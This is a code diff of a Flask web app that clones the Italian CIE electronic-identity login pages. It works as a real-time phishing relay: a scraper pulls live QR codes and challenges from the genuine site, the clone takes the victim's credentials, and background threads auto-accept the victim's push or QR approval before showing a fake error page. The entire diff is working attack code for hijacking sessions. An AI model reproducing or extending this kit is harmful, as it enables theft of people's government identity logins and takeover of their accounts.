@@ -26,24 +26,27 @@ scraper: scraping.Scraper
 def landing_page():
     return render_template('landing_page.html', node = str(random.randrange(1, 7)))
 
-# The idea is: pressing the 'login with CIE' button will redirect here,
-# which will actually do the same on the original website, which will give
-# us the valid qr code, and then THIS page will redirect to the login_page
-# with the valid challenge and qr code
 @app.route('/do_login/', methods = ["POST", "GET"])
 def do_login():
+    """
+    When pressing the "entra con CIE" button (@see templates/landing_page.html at line 938), we redirect here, where:
+    - we do the exact same with our scraper, retrieving the valid qr code and challenge
+    - go to /idp/login/livello2 page with these info as arguments
+    """
     elements = scraper.get_cie_page_elements()
     challenge = elements.get("challenge", "NA")
     qr_str = elements.get("qr_str", "NA")
     op_id = elements.get("op_id", "NA")
     return redirect(url_for('cie_level2', lang='it', challenge = challenge, qr_str = qr_str, op_id = op_id))
 
-@app.route('/idp/login/sessionClosure')
-def cie_error():
-    return render_template('cie_error_it')
-
 @app.route('/idp/login/livello2/', methods=['GET', 'POST'])
 def cie_level2():
+    """
+    To emulate the original website, we use the same address for two different things:
+    1) the login page with credentials/QR code (if challenge is present in the arguments)
+    2) the "waiting for push notification" page on success, or the "wrong credentials"
+        page on error (if challenge is absent in the arguments)
+    """
     challenge = request.args.get('challenge')
     lang = request.form.get('lang', "it")
     # the original website does not change url throughout the login process, so we emulate that
@@ -58,6 +61,15 @@ def cie_level2():
             p = "cie_waiting_push" if result else "cie_wrong_credentials",
             lang = "deu" if lang == "deu" else "it"
         )
+
+        # execute in background: this will wait for the user to accept 
+        # push notification and automatically press the button to accept.
+        # Moreover, it will set scraper.push_approved to true, letting us know
+        # that the user should be shown an error page (we completed login).
+        # This is done via static/cie_waiting_push/l12.js.jsp. It polls
+        # /idp/login/livello1e2checkpush, and if the returned status is
+        # wait it does nothing, if the return status is anything else it calls
+        # /idp/login/livello1e2postpush
         if result:
             executor = ThreadPoolExecutor(max_workers=2)
             _ = executor.submit(scraper.approve, 120)
@@ -69,6 +81,9 @@ def cie_level2():
         p = "wrong_credentials_cie" if state.wrong_credentials else "cie_login",
        lang = "deu" if lang == "deu" else "it"
    )
+    if not state.wrong_credentials:
+        executor = ThreadPoolExecutor(max_workers=2)
+        _ = executor.submit(scraper.qr_approve, 120)
 
     return render_template(page, qr_str = qr_str, challenge = challenge)
 
@@ -78,17 +93,20 @@ def check_push():
         return jsonify({"status": "OK"})
     return jsonify({"status": "WAIT"})
 
+@app.route("/idp/login/livello1e2checkqrcode")
+def check_qr():
+    if scraper.qr_approved:
+        return jsonify({"status": "OK"})
+    return jsonify({"status": "WAIT"})
 
+
+# post approval: just show an error page
 @app.route("/idp/login/livello1e2postpush")
 def cie_push_approved():
     return render_template("cie_error_it.html")
 
 @app.route('/idp/login/livello1e2postqrcode')
 def cie_qr_code_approved():
-    return todo()
-
-@app.route('/test')
-def test():
     return render_template("cie_error_it.html")
 
 if __name__ == '__main__':
